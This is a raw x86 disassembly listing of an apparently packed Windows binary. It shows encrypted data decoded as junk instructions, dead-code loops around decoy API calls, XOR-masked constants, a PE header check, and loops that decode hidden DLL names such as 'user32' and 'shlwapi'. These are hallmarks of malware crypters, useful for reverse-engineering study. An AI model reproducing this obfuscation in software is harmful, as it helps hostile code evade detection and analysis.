  423d70:	(bad)  
  423d71:	dec    edi
  423d72:	lds    edx,FWORD PTR ds:0x26e6d125
  423d78:	and    al,BYTE PTR [ecx]
  423d7a:	add    BYTE PTR [ebp+0x3],0xdd
  423d7e:	add    eax,0xd7c35b1b
  423d83:	scas   al,BYTE PTR es:[edi]
  423d84:	bound  ecx,QWORD PTR [edx+0x47]
  423d87:	mov    ds:0xb0639059,al
  423d8c:	lods   eax,DWORD PTR ds:[esi]
  423d8d:	daa    
  423d8e:	fst    QWORD PTR [edi-0x65]
  423d91:	in     al,dx
  423d92:	xor    dl,cl
  423d94:	mov    esi,0xd00ad47a
  423d99:	ss hlt 
  423d9b:	lods   al,BYTE PTR ds:[esi]
  423d9c:	(bad)  
  423d9d:	fmul   st(1),st
  423d9f:	in     al,dx
  423da0:	push   es
  423da1:	mov    ebp,0x241328e8
  423da6:	cld    
  423da7:	inc    ebp
  423da8:	mov    bl,ah
  423daa:	cmp    al,0xf
  423dac:	xchg   BYTE PTR [ebp+0x7d],dh
  423daf:	fwait
  423db0:	ror    BYTE PTR [ebx],cl
  423db2:	pop    ds
  423db3:	outs   dx,DWORD PTR ds:[esi]
  423db4:	test   al,0xbf
  423db6:	mov    es,WORD PTR [ebp-0xf]
  423db9:	stos   DWORD PTR es:[edi],eax
  423dba:	loope  0x423de5
  423dbc:	rcr    DWORD PTR [edx],1
  423dbe:	or     cl,bh
  423dc0:	outs   dx,BYTE PTR ds:[esi]
  423dc1:	shl    BYTE PTR [edi+0x7f],0x24
  423dc5:	dec    esp
  423dc6:	sbb    bl,BYTE PTR [edx-0x23]
  423dc9:	imul   eax,edi,0x2b
  423dcc:	shl    DWORD PTR ds:0x8911fd6,1
  423dd2:	jge    0x423d8e
  423dd4:	adc    al,0xf9
  423dd6:	ja     0x423d8b
  423dd8:	fist   DWORD PTR [ecx+ebx*2+0x64484404]
  423ddf:	mov    al,BYTE PTR [edx+0x5a]
  423de2:	inc    ebp
  423de3:	(bad)  
  423de4:	ucomiss xmm4,DWORD PTR es:[ebp-0x11]
  423de9:	jecxz  0x423d84
  423deb:	out    dx,eax
  423dec:	out    dx,eax
  423ded:	and    BYTE PTR [esi],al
  423def:	stos   DWORD PTR es:[edi],eax
  423df0:	mov    edi,0xb22912e
  423df5:	dec    ecx
  423df6:	inc    eax
  423df7:	sbb    ebx,DWORD PTR [edx-0x56]
  423dfa:	std    
  423dfb:	push   ecx
  423dfc:	dec    edx
  423dfd:	xlat   BYTE PTR ds:[ebx]
  423dfe:	inc    ebx
  423dff:	push   esi
  423e00:	daa    
  423e01:	push   0x47bb5e2c
  423e06:	xchg   ebx,eax
  423e07:	pop    eax
  423e08:	inc    esi
  423e09:	pop    eax
  423e0a:	shl    BYTE PTR [edi-0x1f8fdd58],0x94
  423e11:	dec    ebx
  423e12:	mov    ebp,0x3e67d315
  423e17:	fild   QWORD PTR [eax+0x414eba91]
  423e1d:	sbb    ebx,DWORD PTR [edx]
  423e1f:	xor    BYTE PTR [esi-0x53bec7fd],0xbe
  423e26:	lods   al,BYTE PTR ds:[esi]
  423e27:	in     eax,dx
  423e28:	push   ds
  423e29:	jecxz  0x423dc2
  423e2b:	mov    bh,0xb2
  423e2d:	ret    
  423e2e:	out    0xac,eax
  423e30:	pop    ebp
  423e31:	enter  0x2281,0xa5
  423e35:	cld    
  423e36:	into   
  423e37:	stos   DWORD PTR es:[edi],eax
  423e38:	inc    edi
  423e39:	(bad)  [edi]
  423e3b:	daa    
  423e3c:	xor    ebx,edi
  423e3e:	cli    
  423e3f:	sbb    al,0x88
  423e41:	mov    ch,BYTE PTR [bx]
  423e44:	shl    DWORD PTR [ebx],cl
  423e46:	hlt    
  423e47:	cs in  eax,0xee
  423e4a:	mov    esp,0x7d4e4c01
  423e4f:	push   edi
  423e50:	jle    0x423eba
  423e52:	psllw  mm4,QWORD PTR [esp+eiz*4-0x124ba1bd]
  423e5a:	enter  0xd350,0x47
  423e5e:	jae    0x423e6e
  423e60:	xor    BYTE PTR [edi],ah
  423e62:	mov    ebx,0x354c0e9c
  423e67:	js     0x423e14
  423e69:	lods   al,BYTE PTR ds:[esi]
  423e6a:	es fsub st(3),st
  423e6d:	and    esi,esp
  423e6f:	lea    edx,[esi]
  423e71:	stos   DWORD PTR es:[edi],eax
  423e72:	imul   edx,DWORD PTR [edi+edi*4-0x4c],0xffffffdb
  423e77:	xchg   edx,eax
  423e78:	nop
  423e79:	sub    BYTE PTR [ebp-0x69099e19],ch
  423e7f:	es push eax
  423e81:	or     esi,ebx
  423e83:	sub    eax,0xf7176d57
  423e88:	mov    cl,0xec
  423e8a:	push   cs
  423e8b:	(bad)  
  423e8c:	inc    BYTE PTR [ebx-0x39f48a5e]
  423e92:	in     eax,0x2e
  423e94:	xchg   ecx,eax
  423e95:	sub    bh,dh
  423e97:	push   esp
  423e98:	inc    eax
  423e99:	or     al,0xb4
  423e9b:	inc    esi
  423e9c:	mov    BYTE PTR [esi+0x6a],0x1c
  423ea0:	inc    ebp
  423ea1:	and    esp,esp
  423ea3:	ret    
  423ea4:	dec    edi
  423ea5:	mov    ecx,0x47dfe75c
  423eaa:	pusha  
  423eab:	mov    bh,0xbd
  423ead:	pop    ds
  423eae:	je     0x423ef3
  423eb0:	ret    0xaab4
  423eb3:	mov    ah,0x3
  423eb5:	mov    WORD PTR [ebp+0x47c61675],ss
  423ebb:	imul   ebp,DWORD PTR [edi],0x84feef5
  423ec1:	mov    fs,WORD PTR [edx+0x5d]
  423ec4:	js     0x423ecf
  423ec6:	out    dx,al
  423ec7:	jge    0x423f09
  423ec9:	gs loop 0x423ee0
  423ecc:	(bad)  
  423ecd:	test   DWORD PTR [edx+0x7f],0xa6019c19
  423ed4:	das    
  423ed5:	fmul   QWORD PTR [esi]
  423ed7:	jne    0x423ea7
  423ed9:	xor    ecx,ebx
  423edb:	lahf   
  423edc:	aad    0xb3
  423ede:	inc    esp
  423edf:	hlt    
  423ee0:	(bad)  
  423ee1:	outs   dx,DWORD PTR ds:[esi]
  423ee2:	sbb    ch,BYTE PTR [ebp+0x44]
  423ee5:	(bad)  
  423ee6:	xor    al,0xb9
  423ee8:	xor    ebx,0x0
  423eeb:	mov    eax,ecx
  423eed:	add    eax,0xfabdbecf
  423ef2:	adc    edi,0xffffffff
  423ef5:	xor    eax,0x8a29a145
  423efa:	xor    edi,0x0
  423efd:	cmp    eax,esi
  423eff:	jne    0x421ae1
  423f05:	cmp    edi,ebx
  423f07:	jne    0x421ae1
  423f0d:	mov    eax,0xf89c85b8
  423f12:	pop    ebx
  423f13:	pop    edi
  423f14:	pop    esi
  423f15:	leave  
  423f16:	ret    0xc
  423f19:	push   ebp
  423f1a:	mov    ebp,esp
  423f1c:	push   ecx
  423f1d:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  423f24:	and    edx,ecx
  423f26:	mov    eax,DWORD PTR [ebp+0x8]
  423f29:	and    DWORD PTR ds:0x428e95,edi
  423f2f:	movsx  eax,BYTE PTR [eax]
  423f32:	sub    edx,ecx
  423f34:	mov    edx,0x3272f8
  423f39:	xor    ecx,ecx
  423f3b:	add    ecx,DWORD PTR ds:0x428e9d
  423f41:	and    DWORD PTR ds:0x428e71,ecx
  423f47:	sub    eax,edx
  423f49:	mov    ecx,0x75108b1
  423f4e:	sub    DWORD PTR ds:0x428e29,0x428e25
  423f58:	xor    eax,ecx
  423f5a:	cmp    eax,0xf89c85e4
  423f5f:	mov    DWORD PTR ds:0x428e9d,0x7b75
  423f69:	jne    0x423ff4
  423f6f:	and    DWORD PTR ds:0x428e25,0x0
  423f79:	mov    eax,ds:0x428e25
  423f7e:	inc    eax
  423f7f:	mov    ds:0x428e25,eax
  423f84:	cmp    DWORD PTR ds:0x428e25,0x6
  423f8b:	jbe    0x423fcb
  423f91:	jmp    0x423fa6
  423f96:	push   0x42804e
  423f9b:	push   DWORD PTR [ebp-0xc]
  423f9e:	push   0x0
  423fa0:	call   DWORD PTR ds:0x42ca4c
  423fa6:	cmp    DWORD PTR ds:0x428e25,0x5
  423fad:	jne    0x423fbe
  423fb3:	mov    eax,ds:0x428e25
  423fb8:	inc    eax
  423fb9:	mov    ds:0x428e25,eax
  423fbe:	cmp    DWORD PTR ds:0x428e25,0x1a
  423fc5:	jb     0x423f79
  423fcb:	mov    eax,DWORD PTR [ebp+0x8]
  423fce:	push   esi
  423fcf:	mov    esi,DWORD PTR [ebp+0x8]
  423fd2:	add    esi,DWORD PTR [eax+0x3c]
  423fd5:	mov    DWORD PTR [ebp+0x8],esi
  423fd8:	mov    eax,DWORD PTR [ebp-0x4]
  423fdb:	mov    esi,DWORD PTR [ebp+0x8]
  423fde:	xor    eax,ecx
  423fe0:	add    eax,edx
  423fe2:	cmp    DWORD PTR [esi+0x54],eax
  423fe5:	pop    esi
  423fe6:	je     0x423ff4
  423fec:	mov    eax,DWORD PTR [ebp+0x8]
  423fef:	jmp    0x423ffb
  423ff4:	mov    eax,DWORD PTR [ebp-0x4]
  423ff7:	xor    eax,ecx
  423ff9:	add    eax,edx
  423ffb:	leave  
  423ffc:	ret    0x4
  423fff:	push   ebp
  424000:	mov    ebp,esp
  424002:	sub    esp,0xc
  424005:	adc    DWORD PTR ds:0x428e71,ebx
  42400b:	push   esi
  42400c:	or     ecx,0x44ac
  424012:	mov    eax,0xf89c85b9
  424017:	mov    DWORD PTR ds:0x428eb5,0x14
  424021:	cmp    DWORD PTR ds:0x428eb5,0x0
  424028:	je     0x42405d
  42402e:	cmp    DWORD PTR ds:0x428eb5,0x1d
  424035:	jb     0x42405d
  42403b:	jmp    0x424049
  424040:	push   DWORD PTR [ebp-0x24]
  424043:	call   DWORD PTR ds:0x42ca50
  424049:	xor    edx,edx
  42404b:	add    edx,DWORD PTR ds:0x428eb5
  424051:	dec    edx
  424052:	mov    DWORD PTR ds:0x428eb5,edx
  424058:	jmp    0x424021
  42405d:	mov    DWORD PTR [ebp-0x8],eax
  424060:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  424067:	and    DWORD PTR ds:0x428e65,0x0
  424071:	jmp    0x424083
  424076:	mov    ecx,DWORD PTR ds:0x428e65
  42407c:	inc    ecx
  42407d:	mov    DWORD PTR ds:0x428e65,ecx
  424083:	cmp    DWORD PTR ds:0x428e65,0x19
  42408a:	jae    0x4240c5
  424090:	cmp    DWORD PTR ds:0x428e65,0x1b
  424097:	jle    0x4240c5
  42409d:	jmp    0x4240c0
  4240a2:	push   DWORD PTR [ebp-0xc]
  4240a5:	push   0x1fe6
  4240aa:	push   DWORD PTR [ebp-0x1c]
  4240ad:	push   DWORD PTR [ebp-0xc]
  4240b0:	push   0x428124
  4240b5:	push   0x1d19
  4240ba:	call   DWORD PTR ds:0x42ca10
  4240c0:	jmp    0x424076
  4240c5:	mov    esi,DWORD PTR [ebp-0x4]
  4240c8:	xor    DWORD PTR ds:0x428e35,0x687d
  4240d2:	push   edi
  4240d3:	mov    DWORD PTR ds:0x428e8d,0x1d
  4240dd:	cmp    DWORD PTR ds:0x428e8d,0x0
  4240e4:	je     0x42412b
  4240ea:	cmp    DWORD PTR ds:0x428e8d,0x26
  4240f1:	ja     0x42412b
  4240f7:	jmp    0x424119
  4240fc:	push   0x4877
  424101:	push   0x5dd2
  424106:	push   0x3bfb
  42410b:	push   DWORD PTR [ebp-0x24]
  42410e:	push   0x428e91
  424113:	call   DWORD PTR ds:0x42ca14
  424119:	mov    ecx,DWORD PTR ds:0x428e8d
  42411f:	dec    ecx
  424120:	mov    DWORD PTR ds:0x428e8d,ecx
  424126:	jmp    0x4240dd
  42412b:	mov    edi,DWORD PTR [ebp-0x8]
  42412e:	mov    ecx,0x75108b1
  424133:	xor    esi,ecx
  424135:	xor    edi,ecx
  424137:	mov    edx,0x3272f8
  42413c:	add    edi,edx
  42413e:	add    esi,edx
  424140:	imul   esi,edi
  424143:	mov    edi,DWORD PTR [ebp+0xc]
  424146:	cmp    edi,esi
  424148:	je     0x42419d
  42414e:	mov    DWORD PTR [ebp-0xc],eax
  424151:	mov    eax,DWORD PTR [ebp-0xc]
  424154:	mov    esi,DWORD PTR [ebp+0xc]
  424157:	xor    eax,ecx
  424159:	lea    eax,[eax*8+0x1939838]
  424160:	mov    eax,DWORD PTR [esi+eax*1]
  424163:	mov    DWORD PTR [ebp+0xc],eax
  424166:	mov    eax,DWORD PTR [ebp-0x4]
  424169:	mov    esi,DWORD PTR [ebp-0x8]
  42416c:	xor    eax,ecx
  42416e:	xor    esi,ecx
  424170:	add    esi,edx
  424172:	add    eax,edx
  424174:	imul   eax,esi
  424177:	mov    esi,DWORD PTR [ebp+0xc]
  42417a:	cmp    esi,eax
  42417c:	je     0x42419d
  424182:	mov    eax,DWORD PTR [ebp-0x4]
  424185:	xor    eax,ecx
  424187:	mov    ecx,DWORD PTR [ebp+0xc]
  42418a:	add    eax,edx
  42418c:	imul   eax,ecx
  42418f:	add    eax,DWORD PTR [ebp+0x8]
  424192:	mov    DWORD PTR [ebp+0xc],eax
  424195:	mov    eax,DWORD PTR [ebp+0xc]
  424198:	jmp    0x4241ae
  42419d:	mov    eax,DWORD PTR [ebp-0x4]
  4241a0:	mov    esi,DWORD PTR [ebp-0x8]
  4241a3:	xor    esi,ecx
  4241a5:	xor    eax,ecx
  4241a7:	add    esi,edx
  4241a9:	add    eax,edx
  4241ab:	imul   eax,esi
  4241ae:	pop    edi
  4241af:	pop    esi
  4241b0:	leave  
  4241b1:	ret    0x8
	...
  4241c4:	iret   
  4241c5:	lods   eax,DWORD PTR ds:[esi]
  4241c6:	mov    ecx,DWORD PTR [ebp+0x0]
  4241c9:	add    BYTE PTR [eax],al
  4241cb:	add    BYTE PTR [edx],al
  4241cd:	add    BYTE PTR [eax],al
  4241cf:	add    BYTE PTR [ecx+0x0],al
  4241d2:	add    BYTE PTR [eax],al
  4241d4:	loopne 0x424217
  4241d6:	add    al,BYTE PTR [eax]
  4241d8:	loopne 0x42420f
  4241da:	add    al,BYTE PTR [eax]
  4241dc:	add    BYTE PTR [eax],al
  4241de:	add    BYTE PTR [eax],al
  4241e0:	push   edx
  4241e1:	push   ebx
  4241e2:	inc    esp
  4241e3:	push   ebx
  4241e4:	pushf  
  4241e5:	inc    eax
  4241e6:	dec    eax
  4241e7:	push   ecx
  4241e8:	dec    edx
  4241e9:	mov    ah,0x96
  4241eb:	dec    esp
  4241ec:	scas   al,BYTE PTR es:[edi]
  4241ed:	xor    eax,0x64f25df1
  4241f2:	dec    edx
  4241f3:	or     al,0x1
  4241f5:	add    BYTE PTR [eax],al
  4241f7:	add    BYTE PTR [ebx+0x3a],al
  4241fa:	pop    esp
  4241fb:	inc    esi
  4241fc:	outs   dx,DWORD PTR ds:[esi]
  4241fd:	ins    BYTE PTR es:[edi],dx
  4241fe:	fs gs jb 0x424222
  424202:	outs   dx,DWORD PTR ds:[esi]
  424203:	data16 and BYTE PTR [edi+0x6f],dl
  424207:	jb     0x424274
  424209:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424210:	push   0x65
  424212:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424216:	jb     0x424287
  424218:	push   0x65
  42421a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42421e:	jae    0x424294
  424220:	add    BYTE PTR [ebx-0x137e13ab],cl
  424226:	or     BYTE PTR [ecx],al
  424228:	add    BYTE PTR [eax],al
  42422a:	push   ebx
  42422b:	mov    eax,ebx
  42422d:	xchg   ecx,eax
  42422e:	mov    eax,DWORD PTR [ebp+0x8]
  424231:	cmp    eax,0xf89c85b9
  424236:	jne    0x4246ce
  42423c:	mov    eax,DWORD PTR [ebp+0xc]
  42423f:	cmp    eax,0xf89c85b8
  424244:	jne    0x4246ce
  42424a:	mov    eax,DWORD PTR [ebp+0x24]
  42424d:	mov    DWORD PTR [ebp-0x4],eax
  424250:	mov    eax,DWORD PTR [ebp-0x4]
  424253:	mov    eax,DWORD PTR [eax+0x1d8]
  424259:	mov    eax,DWORD PTR [eax]
  42425b:	mov    eax,DWORD PTR [eax]
  42425d:	mov    DWORD PTR [ebp-0x8],eax
  424260:	mov    BYTE PTR [ebp-0x18],0xe2
  424264:	mov    BYTE PTR [ebp-0x17],0xdf
  424268:	mov    BYTE PTR [ebp-0x16],0xe4
  42426c:	mov    BYTE PTR [ebp-0x15],0xae
  424270:	mov    BYTE PTR [ebp-0x14],0xad
  424274:	mov    BYTE PTR [ebp-0x13],0x7b
  424278:	mov    BYTE PTR [ebp-0x20],0xf0
  42427c:	mov    BYTE PTR [ebp-0x1f],0xee
  424280:	mov    BYTE PTR [ebp-0x1e],0xe0
  424284:	mov    BYTE PTR [ebp-0x1d],0xed
  424288:	mov    BYTE PTR [ebp-0x1c],0xae
  42428c:	mov    BYTE PTR [ebp-0x1b],0xad
  424290:	mov    BYTE PTR [ebp-0x1a],0x7b
  424294:	mov    BYTE PTR [ebp-0x28],0xee
  424298:	mov    BYTE PTR [ebp-0x27],0xe3
  42429c:	mov    BYTE PTR [ebp-0x26],0xe7
  4242a0:	mov    BYTE PTR [ebp-0x25],0xf2
  4242a4:	mov    BYTE PTR [ebp-0x24],0xdc
  4242a8:	mov    BYTE PTR [ebp-0x23],0xeb
  4242ac:	mov    BYTE PTR [ebp-0x22],0xe4
  4242b0:	mov    BYTE PTR [ebp-0x21],0x7b
  4242b4:	xor    ecx,ecx
  4242b6:	lea    eax,[ebp+ecx*1-0x18]
  4242ba:	movzx  edx,BYTE PTR [eax]
  4242bd:	xor    edx,0x80
  4242c3:	add    edx,0x5
  4242c6:	inc    ecx
  4242c7:	mov    BYTE PTR [eax],dl
  4242c9:	cmp    ecx,0x6
  4242cc:	jb     0x4242b6
  4242ce:	xor    ecx,ecx
  4242d0:	lea    eax,[ebp+ecx*1-0x20]
  4242d4:	movzx  edx,BYTE PTR [eax]
  4242d7:	xor    edx,0x80
  4242dd:	add    edx,0x5
  4242e0:	inc    ecx
  4242e1:	mov    BYTE PTR [eax],dl
  4242e3:	cmp    ecx,0x7
  4242e6:	jb     0x4242d0
  4242e8:	xor    ecx,ecx
  4242ea:	lea    eax,[ebp+ecx*1-0x28]
  4242ee:	movzx  edx,BYTE PTR [eax]
  4242f1:	xor    edx,0x80
  4242f7:	add    edx,0x5
  4242fa:	inc    ecx
  4242fb:	mov    BYTE PTR [eax],dl
  4242fd:	cmp    ecx,0x8
  424300:	jb     0x4242ea
  424302:	lea    eax,[ebp-0x2c]
  424305:	mov    DWORD PTR [ebp-0x8],eax
  424308:	mov    ecx,DWORD PTR [ebp-0x8]
  42430b:	mov    eax,0x7113fcef
  424310:	push   esi
  424311:	mov    DWORD PTR [ecx],eax
  424313:	mov    ecx,DWORD PTR [ebp-0x2c]
  424316:	mov    esi,0x4e3e
  42431b:	push   edi
  42431c:	lea    edi,[esi-0xa]
  42431f:	mov    ebx,0x3272f8
  424324:	cmp    ecx,eax
  424326:	jne    0x4243f7
  42432c:	lea    eax,[esi+0x39]
  42432f:	mov    WORD PTR [ebp-0x78],ax
  424333:	mov    eax,esi
  424335:	mov    WORD PTR [ebp-0x76],ax
  424339:	add    eax,0x3b
  42433c:	mov    WORD PTR [ebp-0x74],ax
  424340:	lea    eax,[esi-0x6]
  424343:	mov    WORD PTR [ebp-0x72],ax
  424347:	add    eax,0x47
  42434a:	mov    WORD PTR [ebp-0x70],ax
  42434e:	mov    eax,edi
  424350:	mov    WORD PTR [ebp-0x6e],ax
  424354:	mov    eax,0x4f92
  424359:	mov    WORD PTR [ebp-0x6c],ax
  42435d:	lea    eax,[esi-0x9]
  424360:	mov    WORD PTR [ebp-0x6a],ax
  424364:	add    eax,0x30
  424367:	mov    WORD PTR [ebp-0x68],ax
  42436b:	lea    eax,[esi-0xd]
  42436e:	mov    WORD PTR [ebp-0x66],ax
  424372:	mov    eax,esi
  424374:	mov    WORD PTR [ebp-0x64],ax
  424378:	add    eax,0xfffffff4
  42437b:	mov    WORD PTR [ebp-0x62],ax
  42437f:	mov    eax,0x44b
  424384:	mov    WORD PTR [ebp-0x60],ax
  424388:	mov    eax,0x5674
  42438d:	mov    WORD PTR [ebp-0x5e],ax
  424391:	mov    eax,0x6114
  424396:	mov    WORD PTR [ebp-0x5c],ax
  42439a:	mov    eax,0xf1e6
  42439f:	mov    WORD PTR [ebp-0x5a],ax
  4243a3:	mov    eax,edi
  4243a5:	mov    WORD PTR [ebp-0x58],ax
  4243a9:	lea    eax,[ebp-0xe0]
  4243af:	push   eax
  4243b0:	mov    eax,DWORD PTR [ebp+0xc]
  4243b3:	xor    eax,0x75108b1
  4243b8:	add    eax,ebx
  4243ba:	push   eax
  4243bb:	lea    eax,[ebp-0x78]
  4243be:	push   eax
  4243bf:	mov    eax,DWORD PTR [ebp-0x4]
  4243c2:	mov    eax,DWORD PTR [eax+0x198]
  4243c8:	mov    DWORD PTR [ebp-0xe0],0x1
  4243d2:	mov    DWORD PTR [ebp-0xdc],0xffff
  4243dc:	push   DWORD PTR [eax]
  4243de:	mov    eax,DWORD PTR [ebp+0x10]
  4243e1:	call   eax
  4243e3:	mov    DWORD PTR [ebp-0x8],eax
  4243e6:	mov    eax,DWORD PTR [ebp-0x8]
  4243e9:	test   eax,eax
  4243eb:	je     0x4243f7
  4243ed:	xor    DWORD PTR ds:0xe041cdd,0x9f170bcc
  4243f7:	mov    eax,DWORD PTR [ebp-0x4]
  4243fa:	mov    ecx,DWORD PTR [eax+0x18c]
  424400:	xor    eax,eax
  424402:	cmp    DWORD PTR [ecx],eax
  424404:	jne    0x42463e
  42440a:	mov    ecx,DWORD PTR [ebp-0x4]
  42440d:	mov    ecx,DWORD PTR [ecx+0x17c]
  424413:	mov    DWORD PTR [ecx],eax
  424415:	mov    ecx,DWORD PTR [ebp-0x4]
  424418:	mov    ecx,DWORD PTR [ecx+0x180]
  42441e:	mov    DWORD PTR [ecx],eax
  424420:	mov    eax,0x4e69
  424425:	mov    WORD PTR [ebp-0x9c],ax
  42442c:	mov    eax,esi
  42442e:	mov    WORD PTR [ebp-0x9a],ax
  424435:	mov    eax,0x4e79
  42443a:	mov    WORD PTR [ebp-0x98],ax
  424441:	add    eax,0xffffffc0
  424444:	mov    WORD PTR [ebp-0x96],ax
  42444b:	mov    eax,0x4f8e
  424450:	mov    WORD PTR [ebp-0x94],ax
  424457:	mov    eax,0x4e3a
  42445c:	mov    WORD PTR [ebp-0x92],ax
  424463:	mov    eax,esi
  424465:	mov    WORD PTR [ebp-0x8c],ax
  42446c:	mov    eax,0x4e35
  424471:	mov    WORD PTR [ebp-0x8a],ax
  424478:	mov    eax,0x99f9
  42447d:	mov    WORD PTR [ebp-0x88],ax
  424484:	mov    eax,0x8d6a
  424489:	mov    WORD PTR [ebp-0x86],ax
  424490:	mov    eax,0xd66f
  424495:	mov    WORD PTR [ebp-0x84],ax
  42449c:	mov    BYTE PTR [ebp-0x10],0xee
  4244a0:	mov    eax,0xd78b
  4244a5:	mov    WORD PTR [ebp-0x82],ax
  4244ac:	mov    BYTE PTR [ebp-0xf],0xe3
  4244b0:	mov    eax,0x2784
  4244b5:	mov    BYTE PTR [ebp-0xe],0xe7
  4244b9:	mov    WORD PTR [ebp-0x80],ax
  4244bd:	mov    BYTE PTR [ebp-0xd],0xf2
  4244c1:	mov    eax,0x4784
  4244c6:	mov    BYTE PTR [ebp-0xc],0xdc
  4244ca:	mov    WORD PTR [ebp-0x7e],ax
  4244ce:	mov    eax,0x4e3b
  4244d3:	mov    BYTE PTR [ebp-0xb],0xeb
  4244d7:	push   0x8
  4244d9:	mov    BYTE PTR [ebp-0xa],0xe4
  4244dd:	mov    WORD PTR [ebp-0x7c],ax
  4244e1:	mov    BYTE PTR [ebp-0x9],0x7b
  4244e5:	mov    DWORD PTR [ebp-0x90],0x4e344e65
  4244ef:	lea    eax,[ebp-0x10]
  4244f2:	pop    edi
  4244f3:	movzx  ecx,BYTE PTR [eax]
  4244f6:	xor    ecx,0x80
  4244fc:	add    ecx,0x5
  4244ff:	mov    BYTE PTR [eax],cl
  424501:	inc    eax
  424502:	dec    edi
  424503:	jne    0x4244f3
  424505:	mov    DWORD PTR [ebp-0xe0],0x1
  42450f:	lea    eax,[ebp-0x10]
  424512:	mov    DWORD PTR [ebp-0xdc],eax
  424518:	mov    ecx,0x4e66
  42451d:	mov    eax,ecx
  42451f:	mov    WORD PTR [ebp-0x40],ax
  424523:	add    eax,0xd
  424526:	mov    edx,eax
  424528:	mov    WORD PTR [ebp-0x3e],dx
  42452c:	mov    edx,0x4f9b
  424531:	mov    WORD PTR [ebp-0x3c],dx
  424535:	add    edx,0xfffffff8
  424538:	mov    WORD PTR [ebp-0x3a],dx
  42453c:	mov    edx,0x4f8d
  424541:	mov    WORD PTR [ebp-0x38],dx
  424545:	add    edx,0xfffffffb
  424548:	mov    WORD PTR [ebp-0x36],dx
  42454c:	mov    edx,0x4f87
  424551:	mov    WORD PTR [ebp-0x34],dx
  424555:	mov    WORD PTR [ebp-0x32],cx
  424559:	mov    ecx,esi
  42455b:	mov    WORD PTR [ebp-0x30],cx
  42455f:	lea    ecx,[edx-0x1]
  424562:	mov    edx,ecx
  424564:	mov    WORD PTR [ebp-0x54],dx
  424568:	mov    edx,eax
  42456a:	mov    WORD PTR [ebp-0x52],dx
  42456e:	mov    edx,0x4e7b
  424573:	mov    WORD PTR [ebp-0x50],dx
  424577:	mov    WORD PTR [ebp-0x4e],ax
  42457b:	lea    eax,[edx-0xe]
  42457e:	mov    WORD PTR [ebp-0x4c],ax
  424582:	add    eax,0xfffffffb
  424585:	mov    WORD PTR [ebp-0x4a],ax
  424589:	lea    eax,[edx-0x14]
  42458c:	mov    WORD PTR [ebp-0x48],ax
  424590:	mov    WORD PTR [ebp-0x46],cx
  424594:	mov    WORD PTR [ebp-0x44],si
  424598:	mov    ecx,DWORD PTR [ebp+0x8]
  42459b:	movzx  edx,WORD PTR [ebp-0x54]
  42459f:	mov    eax,0x75108b1
  4245a4:	xor    ecx,eax
  4245a6:	add    ecx,ebx
  4245a8:	xor    ecx,edx
  4245aa:	mov    WORD PTR [ebp-0x54],cx
  4245ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4245b1:	xor    ecx,eax
  4245b3:	movzx  eax,WORD PTR [ebp-0x40]
  4245b7:	add    ecx,ebx
  4245b9:	xor    ecx,eax
  4245bb:	xor    eax,eax
  4245bd:	mov    WORD PTR [ebp-0x40],cx
  4245c1:	mov    WORD PTR [ebp-0xf4],ax
  4245c8:	mov    WORD PTR [ebp-0x108],ax
  4245cf:	mov    edi,DWORD PTR [ebp+0x24]
  4245d2:	lea    eax,[ebp-0xf4]
  4245d8:	lea    edx,[ebp-0x54]
  4245db:	mov    DWORD PTR [ebp-0xe0],0x2
  4245e5:	mov    DWORD PTR [ebp-0xdc],eax
  4245eb:	call   0x42702b
  4245f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4245f3:	mov    DWORD PTR [ebp-0xd8],eax
  4245f9:	mov    eax,0x75108b1
  4245fe:	xor    ecx,eax
  424600:	add    ecx,ebx
  424602:	je     0x424621
  424604:	lea    ecx,[ebp-0xe0]
  42460a:	push   ecx
  42460b:	mov    ecx,DWORD PTR [ebp+0xc]
  42460e:	xor    ecx,eax
  424610:	add    ecx,ebx
  424612:	push   ecx
  424613:	lea    eax,[ebp-0x9c]
  424619:	push   eax
  42461a:	mov    eax,DWORD PTR [ebp+0x10]
  42461d:	push   0x0
  42461f:	call   eax
  424621:	mov    edi,DWORD PTR [ebp+0x24]
  424624:	lea    eax,[ebp-0x108]
  42462a:	lea    edx,[ebp-0x40]
  42462d:	mov    DWORD PTR [ebp-0xdc],eax
  424633:	call   0x42702b
  424638:	mov    DWORD PTR [ebp-0xd8],eax
  42463e:	mov    eax,DWORD PTR [ebp+0x14]
  424641:	push   DWORD PTR [ebp-0x4]
  424644:	push   DWORD PTR [ebp+0x20]
  424647:	push   DWORD PTR [ebp+0x1c]
  42464a:	push   DWORD PTR [ebp+0x18]
  42464d:	push   DWORD PTR [ebp+0x10]
  424650:	push   DWORD PTR [ebp+0x8]
  424653:	push   DWORD PTR [ebp+0xc]
  424656:	call   0x4258cc
  42465b:	test   eax,eax
  42465d:	je     0x4246a4
  42465f:	add    DWORD PTR [ebp-0x4],eax
  424662:	push   DWORD PTR [ebp-0x4]
  424665:	lea    esi,[ebp+0x4]
  424668:	call   0x424abc
  42466d:	mov    eax,DWORD PTR [ebp-0x4]
  424670:	mov    eax,DWORD PTR [eax+0x1c8]
  424676:	mov    eax,DWORD PTR [eax]
  424678:	xor    eax,0x75108b1
  42467d:	add    eax,ebx
  42467f:	mov    eax,DWORD PTR [ebp-0x4]
  424682:	jne    0x42469a
  424684:	mov    ecx,DWORD PTR [ebp-0x4]
  424687:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42468d:	push   DWORD PTR [ecx]
  42468f:	mov    eax,DWORD PTR [eax+0x1e0]
  424695:	call   DWORD PTR [eax+0x28]
  424698:	jmp    0x4246a4
  42469a:	mov    eax,DWORD PTR [eax+0x17c]
  4246a0:	mov    eax,DWORD PTR [eax]
  4246a2:	add    DWORD PTR [esi],eax
  4246a4:	mov    eax,DWORD PTR [ebp-0x4]
  4246a7:	mov    eax,DWORD PTR [eax+0x1dc]
  4246ad:	dec    DWORD PTR [eax]
  4246af:	mov    ecx,DWORD PTR [ebp-0x4]
  4246b2:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4246b8:	mov    eax,DWORD PTR [eax]
  4246ba:	lea    eax,[ecx+eax*4]
  4246bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4246c0:	mov    ecx,DWORD PTR [ecx+0x17c]
  4246c6:	mov    eax,DWORD PTR [eax]
  4246c8:	mov    ecx,DWORD PTR [ecx]
